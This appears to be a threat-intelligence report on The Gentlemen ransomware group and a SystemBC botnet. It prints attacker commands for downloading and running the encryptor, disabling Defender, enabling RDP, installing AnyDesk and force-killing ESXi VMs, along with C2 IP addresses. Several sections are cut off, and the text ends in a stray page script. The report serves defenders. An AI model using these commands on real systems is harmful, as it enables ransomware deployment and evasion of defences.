<h2 class="wp-block-heading">Key Points</h2>



<ul class="wp-block-list">
<li><strong>The Gentlemen</strong>&nbsp;ransomware‑as‑a‑service (<strong>RaaS</strong>) program is rapidly gaining popularity, attracting numerous affiliates and publicly claiming&nbsp;<strong>over 320 victims</strong>, with the majority of attacks (<strong>240</strong>) occurring in the first months of 2026.</li>



<li>The service provides a&nbsp;<strong>broad locker portfolio</strong>&nbsp;implemented in&nbsp;<strong>Go</strong>&nbsp;for&nbsp;<strong>Windows</strong>,&nbsp;<strong>Linux</strong>,&nbsp;<strong>NAS</strong>, and&nbsp;<strong>BSD</strong>, plus an additional locker written in&nbsp;<strong>C</strong>&nbsp;for&nbsp;<strong>ESXi</strong>, enabling coverage of the multiple platforms commonly found in corporate environments.</li>



<li>During an incident response engagement, an affiliate associated with&nbsp;<strong>The Gentlemen</strong>&nbsp;attempted to deploy&nbsp;<strong>SystemBC</strong>, a proxy malware frequently leveraged in human‑operated ransomware operations for covert tunneling and payload delivery.</li>



<li><strong>Check Point Research</strong>&nbsp;observed victim telemetry from the relevant <strong>SystemBC</strong> command‑and‑control server, revealing a botnet of&nbsp;<strong>over 1,570 victims</strong>, with the infection profile strongly suggesting a focus on corporate and organizational environments rather than opportunistic consumer targeting.</li>
</ul>



<p class="wp-block-paragraph"><br></p>



<h2 class="wp-block-heading">The Gentlemen RaaS</h2>



<p class="wp-block-paragraph">The <strong>Gentlemen</strong> ransomware‑as‑a‑service (RaaS) operation is a relatively new group that emerged around mid‑2025. The operators advertise their services across multiple underground forums, promoting their ransomware platform and inviting penetration testers (and other technically skilled actors) to join as affiliates.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><img fetchpriority="high" decoding="async" width="1103" height="632" src="https://research.checkpoint.com/wp-content/uploads/2026/04/image-3.png" alt="" class="wp-image-32956" style="width:814px;height:auto" srcset="https://research.checkpoint.com/wp-content/uploads/2026/04/image-3.png 1103w, https://research.checkpoint.com/wp-content/uploads/2026/04/image-3-300x172.png 300w, https://research.checkpoint.com/wp-content/uploads/2026/04/image-3-1024x587.png 1024w, https://research.checkpoint.com/wp-content/uploads/2026/04/image-3-768x440.png 768w" sizes="(max-width: 1103px) 100vw, 1103px" /><figcaption class="wp-element-caption">Figure 1 — The Gentlemen post on underground forums.</figcaption></figure>
</div>


<p class="wp-block-paragraph">The RaaS provides affiliates with multi‑OS lockers for Windows, Linux, NAS, BSD implemented in Go, and an additional locker for ESXi implemented in C. The group also grants verified partners access to EDR‑killing tools and its own multi‑chain pivot infrastructure (server and client components).</p>



<p class="wp-block-paragraph">The group maintains an onion site where it publishes data stolen from victims who refuse to pay. Negotiations, however, are not conducted through this leak portal but via the individual affiliate’s <strong>Tox</strong> ID. Tox is a free, decentralized, peer‑to‑peer (P2P) instant messaging protocol that provides end‑to‑end encrypted voice, video, and text communication.</p>



<p class="wp-block-paragraph">The group also appears to maintain a Twitter/X account, which is referenced in the ransomware note. Through this account, the operators publicly post about victims, likely to increase pressure on them to pay.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><img decoding="async" width="597" height="320" src="https://research.checkpoint.com/wp-content/uploads/2026/04/image-3-1.png" alt="" class="wp-image-32957" style="width:715px;height:auto" srcset="https://research.checkpoint.com/wp-content/uploads/2026/04/image-3-1.png 597w, https://research.checkpoint.com/wp-content/uploads/2026/04/image-3-1-300x161.png 300w" sizes="(max-width: 597px) 100vw, 597px" /><figcaption class="wp-element-caption">Figure 2 — The Gentlemen RaaS X/Twitter account.</figcaption></figure>
</div>


<p class="wp-block-paragraph">To date, the group has publicly claimed a little over <strong>320</strong> victims, with the majority of infections occurring in 2026. This growth in activity suggests that The <strong>Gentlemen</strong> RaaS program has managed to attract a significant number of affiliates over the last few months.</p>



<p class="wp-block-paragraph"><br></p>



<h2 class="wp-block-heading">SystemBC Infections</h2>



<p class="wp-block-paragraph">During an incident response case, an affiliate of <strong>The Gentlemen</strong> Ransomware‑as‑a‑Service (RaaS) deployed <strong>SystemBC</strong>, a proxy malware, on the compromised host. SystemBC establishes SOCKS5 network tunnels within the victim’s environment and connects to its C&amp;C server using a custom RC4‑encrypted protocol. It can also download and execute additional malware, with payloads either written to disk or injected directly into memory.</p>



<p class="wp-block-paragraph">The specific Command and Control server that was used for the communication had infected a large number of victims across the globe. It is likely that the majority of those victims are companies and organizations, given that <strong>SystemBC</strong> is typically deployed as part of human‑operated intrusion workflows rather than massive targeting.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img decoding="async" width="2560" height="1251" src="https://research.checkpoint.com/wp-content/uploads/2026/04/wordmap-scaled.png" alt="" class="wp-image-32964" srcset="https://research.checkpoint.com/wp-content/uploads/2026/04/wordmap-scaled.png 2560w, https://research.checkpoint.com/wp-content/uploads/2026/04/wordmap-300x147.png 300w, https://research.checkpoint.com/wp-content/uploads/2026/04/wordmap-1024x500.png 1024w, https://research.checkpoint.com/wp-content/uploads/2026/04/wordmap-768x375.png 768w, https://research.checkpoint.com/wp-content/uploads/2026/04/wordmap-1536x751.png 1536w, https://research.checkpoint.com/wp-content/uploads/2026/04/wordmap-2048x1001.png 2048w" sizes="(max-width: 2560px) 100vw, 2560px" /><figcaption class="wp-element-caption">Figure 3 — SystemBC global accesses.</figcaption></figure>
</div>


<p class="wp-block-paragraph">There are over 1,570 victims, with the majority located in the United States, followed by the United Kingdom and Germany.</p>

<p class="wp-block-paragraph">Whether <strong>SystemBC</strong> is directly integrated into <strong>The Gentlemen</strong> ransomware ecosystem or is simply a tool leveraged by this particular affiliate for exfiltration and remote access remains unclear. At this time, <strong>Check Point Research</strong> has no evidence to determine the exact nature of this relationship.</p>

<h3 class="wp-block-heading"><strong>Initial Access and Establishment of Domain Control</strong></h3>



<p class="wp-block-paragraph">The precise initial access vector could not be conclusively determined. The earliest stage of adversary activity that can be established with confidence is the attacker’s presence on a Domain Controller with Domain Admin–level privileges. From that position, the attacker appears to have performed systematic credential validation and host accessibility testing across the environment, as reflected in an initial pattern of failed network logons followed by successful authentications originating from the Domain Controller. This sequence is consistent with a controlled effort to verify privileged access and identify viable systems before expanding operations more broadly.</p>



<h3 class="wp-block-heading"><strong>Remote Execution and Early Discovery</strong></h3>



<p class="wp-block-paragraph">Using this privileged position, the attacker deployed Cobalt Strike payloads to remote systems by writing executables to administrative shares such as <code>\\\\[REDACTED_HOSTNAME]\\ADMIN$\\&lt;random_7_char&gt;.exe</code> and executing them via RPC. The first observed deployment occurred on an internal endpoint, after which similar activity appeared across additional hosts. Early post-compromise actions included reconnaissance commands such as <code>cmd.exe /C systeminfo</code>, <code>cmd.exe /C whoami</code>, and enumeration commands like <code>cmd.exe /C dir c:\\users</code>. The attacker also accessed internal documentation via <code>cmd.exe /C type \\\\[REDACTED_HOSTNAME]\\d$\\...\\公司主機紀錄.txt</code>, indicating use of environment-specific knowledge in addition to automated discovery. Expansion to other systems followed quickly, with repeated execution artifacts such as <code>regsvr32.exe</code> across multiple hosts confirming centrally driven activity.</p>



<h3 class="wp-block-heading"><strong>Command-and-Control and Payload Staging</strong></h3>



<p class="wp-block-paragraph">As execution expanded, the attacker attempted to establish additional command-and-control capabilities. On one compromised host, it staged the tool <code>socks.exe</code> &#8211; identified as a variant of SystemBC &#8211; was executed and attempted to communicate with <code>45.86.230[.]112</code>, followed by validation using <code>cmd.exe /C tasklist | findstr /i socks</code>. This tool is commonly used to create SOCKS-based proxy channels for covert communication and internal pivoting. In this instance, however, the activity was blocked by endpoint protection. Shortly thereafter, a remotely executed payload (<code>&lt;random_7_char&gt;.exe</code>) spawned <code>c:\\windows\\system32\\rundll32.exe</code>, which established outbound communication to <code>91.107.247[.]163</code> Cobalt Strike C&amp;C over ports 443 and later 80, indicating successful external command-and-control connectivity through alternative infrastructure.</p>



<p class="wp-block-paragraph">At the same stage, PowerShell was executed from a scheduled task context using:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="true" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">powershell.exe -ExecutionPolicy Bypass -command (new-object net.webclient).downloadfile('http://[REDACTED_DOMAIN_CONTROLLER]:8080/grand.exe', 'c:\\programdata\\r.exe'); c:\\programdata\\r.exe --password VvO8EtUh --spread [REDACTED_DOMAIN]\\[REDACTED_USER]:[REDACTED_PASSWORD]
</pre>



<p class="wp-block-paragraph">This command downloaded <code>grand.exe</code> (the ransomware encryptor) from an internal staging server (DC) and executed it as <code>c:\\programdata\\r.exe</code>. The arguments <code>--password VvO8EtUh</code> and <code>--spread [REDACTED_DOMAIN]\\[REDACTED_USER]:[REDACTED_PASSWORD]</code> indicate both controlled execution and built-in propagation capability, marking a transition from initial access to coordinated malware deployment.</p>



<h3 class="wp-block-heading"><strong>Defense Evasion, Propagation, and Persistence</strong></h3>



<p class="wp-block-paragraph">Following execution of the staged payload, the attacker attempted to weaken host defenses using:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true -Force
</pre>



<p class="wp-block-paragraph">This disabled Windows Defender real-time monitoring. The same payload, identified by a consistent hash, then appeared across numerous systems under different filenames, including <code>c:\\programdata\\r.exe</code>, <code>c:\\programdata\\g.exe</code>, and <code>c:\\programdata\\o.exe</code>. This demonstrates rapid internal propagation via a shared malware component, supported by both domain-level access and the built-in spreading mechanism described earlier.</p>



<p class="wp-block-paragraph">In parallel, the attacker performed environmental checks using commands such as:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">cmd.exe /C wmic product where Name like '%kaspe%' get Name, IdentifyingNumber
</pre>



<p class="wp-block-paragraph">Later, repeatedly executed across multiple hosts:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">cmd.exe /C gpupdate /force
</pre>



<p class="wp-block-paragraph">These attempts suggest the threat actor tried to influence or validate policy state during propagation. Remote Desktop was then enabled through commands such as:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">cmd.exe /C reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
cmd.exe /C netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
</pre>



<p class="wp-block-paragraph">Later, the attacker installed and configured AnyDesk using:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">cmd.exe /C anydesk.exe --install C:\\Program Files (x86)\\AnyDesk\\anydesk.exe --start-with-win

<h3 class="wp-block-heading"><strong>Consolidated View of the Intrusion</strong></h3>



<p class="wp-block-paragraph">Taken together, the attack progressed from suspected perimeter access to domain-level control, followed by credential validation, remote payload execution via ADMIN$ shares, and rapid expansion across endpoints. This was accompanied by attempted and successful command-and-control establishment using infrastructure such as <code>45.86.230[.]112</code> and <code>91.107.247[.]163</code>, staged malware delivery from the internal DC, and widespread propagation of a shared payload under multiple filenames. Defensive measures were actively suppressed, and multiple <strong>persistence and exfiltration</strong> mechanisms were introduced, including RDP and AnyDesk.</p>



<p class="wp-block-paragraph">The failed deployment of SystemBC and the subsequent reliance on alternative channels demonstrate that the attacker adapted their approach when blocked. Overall, the activity reflects coordinated, centrally controlled execution with layered access mechanisms, resulting in broad, durable control over the environment.</p>



<h3 class="wp-block-heading">Impact</h3>



<p class="wp-block-paragraph">The intrusion culminated in the deployment of <strong>The Gentlemen</strong> RaaS payload by an affiliate, using Group Policy as the distribution mechanism. A GPO‑based deployment was configured so that the ransomware binary was executed on domain‑joined systems during policy refresh, resulting in a rapid, near‑simultaneous encryption event across the environment.</p>

<h3 class="wp-block-heading">Antivirus Evasion</h3>



<p class="wp-block-paragraph">The ransomware executes three PowerShell commands to disable <strong>Microsoft Defender</strong> protection and exclude both itself and the entire <strong><code>C:\\</code></strong> drive from scanning and monitoring:</p>



<ul class="wp-block-list">
<li><code>powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true -Force</code>, disables Defender&#8217;s real-time protection entirely, the background scanning that monitors files, downloads, and processes as they&#8217;re accessed. With this off, malware can run without being intercepted.</li>



<li><code>powershell -Command Add-MpPreference -ExclusionProcess &lt;ransomware_exe&gt; -Force</code>, adds a specific executable to Defender&#8217;s process exclusion list. Defender will completely ignore any file activity triggered by that process, even if it&#8217;s doing something malicious.</li>



<li><code>powershell -Command Add-MpPreference -ExclusionPath C:\\ -Force</code>, adds the entire C: drive to Defender&#8217;s path exclusion list. This tells Defender to skip scanning anything on the drive, every file, folder, and executable.</li>
</ul>



<p class="wp-block-paragraph">During lateral movement, the ransomware makes an attempt to blind Windows Defender on each reachable remote host by pushing a PowerShell script that disables real-time monitoring, adds broad exclusions for the drive, staging share, and its own process, shuts down the firewall, re-enables SMB1, and loosens LSA anonymous access controls, all before deploying and executing the ransomware binary on that host.</p>

<p class="wp-block-paragraph">The ransomware tries to disable the firewall to allow unrestricted outbound and inbound traffic. <h3 class="wp-block-heading">Lateral movement, <code>--spread</code> argument</h3>



<p class="wp-block-paragraph">The <code>--spread</code> argument is disabled by default and is assigned the value <code>"DISABLED"</code>. <h3 class="wp-block-heading">File Encryption</h3>



<p class="wp-block-paragraph">Before encryption begins, the ransomware checks whether the file size exceeds <code>0x100000</code> (1,048,576 bytes, or 1 MB). Files of 1 MB or smaller are routed to the small file function, while files larger than 1 MB are routed to the large file function.</p>



<p class="wp-block-paragraph">Regardless of size, the key derivation process is identical for both paths. The ransomware generates a random 32-byte ephemeral private key. Using X25519 (the Diffie–Hellman primitive over Curve25519), it derives two values: first, the ephemeral public key by multiplying the private key with the curve basepoint, and second, a shared secret by combining the ephemeral private key with the attacker’s public key. The ephemeral public key is not secret and will later be stored in the file, while the shared secret remains only in memory. Key material for encryption is then constructed directly from these values. The ephemeral public key is used as the 32-byte symmetric key, while the first 24 bytes of the shared secret (derived with the attacker’s public key) are used as the nonce.</p>



<p class="wp-block-paragraph">For small files (less than 1MB) the contents are encrypted using XChaCha20, a stream cipher, which XORs the plaintext with a keystream to produce ciphertext of identical length. The original file is overwritten in place with this ciphertext.</p>



<p class="wp-block-paragraph">For large files larger than 1 MB, the encryption process changes depending on optional speed mode arguments that control how much of the file is actually encrypted. Instead of processing the entire file, the algorithm only encrypts a small portion of it. In fast mode about 9 percent of the file is encrypted. In superfast mode about 3 percent is encrypted. In ultrafast mode only about 1 percent of the file is affected. The encrypted regions are selected across the file and processed in chunks of about 64 KB. Each chunk is read, encrypted using XChaCha20, and written back to the same position in the file. After encryption, the function appends a footer to the file containing the string <code>--eph--</code>, followed by the base64-encoded ephemeral public key and a newline. This is followed by a marker section <code>--marker--GENTLEMEN\\n</code> and a final <code>GENTLEMEN</code> sentinel. The stored ephemeral public key allows the attacker, who possesses the corresponding private key, to recompute the shared secret and reconstruct the nonce, enabling decryption of the file. If any of the speed-increasing arguments (<code>fast</code>, <code>superfast</code>, or <code>ultrafast</code>) were specified during large file encryption, the selected argument is also appended to the end of the file.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">--eph--$BASE64--marker--GENTLEMEN\nGENTLEMEN--fast--\n
</pre>



<p class="wp-block-paragraph">The attacker&#8217;s decryptor obtains the base64 value from the header (<code>--eph--</code> field), decodes it to get the ephemeral public key, and uses it directly as the ChaCha20 key. It then recomputes <code>sharedSecret = X25519(attacker_privKey, ephemeralPubKey)</code> using the attacker&#8217;s own private key, and uses the first 24 bytes of <code>sharedSecret2</code> as the ChaCha20 nonce. With the key and nonce recovered, it decrypts the encrypted files.</p>

<h3 class="wp-block-heading">VM &amp; Processes Termination</h3>



<p class="wp-block-paragraph">Ransomware operators shut down virtual machines on an ESXi host to make their attack more effective and efficient. By powering off the VMs, they release locks on virtual disk files, allowing those files to be encrypted more reliably and with less risk of interference or corruption. This also disables any security tools running inside the guest systems, reducing the chance of detection or response.</p>



<p class="wp-block-paragraph">The locker performs a controlled shutdown of all virtual machines on a VMware ESXi host. It first lists all registered VMs and iterates through them to issue a graceful power-off command (optionally skipping specified VMs). After a short wait to allow clean shutdowns, it checks for any remaining running VM processes using <code>esxcli</code>. If any VMs are still active, it forcefully terminates them by killing their associated world processes. In effect, it ensures that all VMs are stopped, using escalation from graceful shutdown to hard kill only when necessary.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># Enumerate all registered VMs (popen, output parsed line by line)

# After 8-second sleep: enumerate still-running VM processes (popen)

# Force-kill any remaining VM processes by world-id (one per process)
esxcli vm process kill --type=force --world-id=&lt;world_id> > /dev/null 2>&amp;1
</pre>

function animate_elems() {
	wintop = jQuery(window).scrollTop(); // calculate distance from top of window
	// loop through each item to check when it animates
	$elems.each(function(){
		$elm = jQuery(this);

		topcoords = $elm.offset().top; // element's distance from top of page in pixels

		if(wintop > (topcoords - (winheight))) {
